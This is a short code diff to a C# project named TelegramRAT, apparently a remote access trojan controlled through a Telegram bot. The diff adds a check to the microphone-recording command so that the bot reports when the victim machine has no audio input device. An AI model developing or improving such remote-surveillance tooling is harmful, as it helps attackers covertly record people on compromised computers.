@@ -1303,6 +1303,12 @@ namespace TelegramRAT
                     {
                         try
                         {
+                            if (WaveIn.DeviceCount == 0)
+                            {
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This machine has no audio input devices, the recording isn't possible.", replyToMessageId: update.Message.MessageId);
+                                return;
+                            }
+
                             uint recordLength;
 
                             if (uint.TryParse(model.Args[0], out recordLength) is false)
